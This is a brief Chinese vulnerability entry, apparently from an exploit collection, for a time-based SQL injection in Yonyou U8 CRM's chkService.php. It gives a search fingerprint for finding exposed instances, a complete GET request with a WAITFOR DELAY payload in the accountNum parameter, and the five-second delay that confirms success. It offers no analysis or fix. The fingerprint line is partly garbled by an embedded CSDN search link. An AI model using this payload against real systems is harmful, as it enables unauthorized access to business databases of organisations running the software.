# 用友U8CRMchkService.phpSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="[用友U8](https://so.csdn.net/so/search?q=%E7%94%A8%E5%8F%8BU8&spm=1001.2101.3001.7020"`
- **请求**：`GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s